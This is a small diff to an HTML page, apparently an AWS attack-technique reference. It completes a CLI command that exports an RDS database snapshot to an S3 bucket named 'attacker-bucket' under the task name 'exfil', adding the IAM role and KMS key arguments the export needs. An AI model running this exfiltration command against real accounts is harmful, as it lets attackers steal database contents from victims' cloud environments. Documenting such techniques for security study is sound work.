@@ -396,7 +396,9 @@
           <pre><code>aws rds start-export-task \\
   --export-task-identifier exfil \\
   --source-arn arn:aws:rds:REGION:ACCOUNT:snapshot:snap-xxx \\
-  --s3-bucket-name attacker-bucket</code></pre>
+  --s3-bucket-name attacker-bucket \\
+  --iam-role-arn arn:aws:iam::ACCOUNT:role/ExportRole \\
+  --kms-key-id arn:aws:kms:REGION:ACCOUNT:key/xxx</code></pre>
         </div></div></div>
 
 <!-- Policies -->
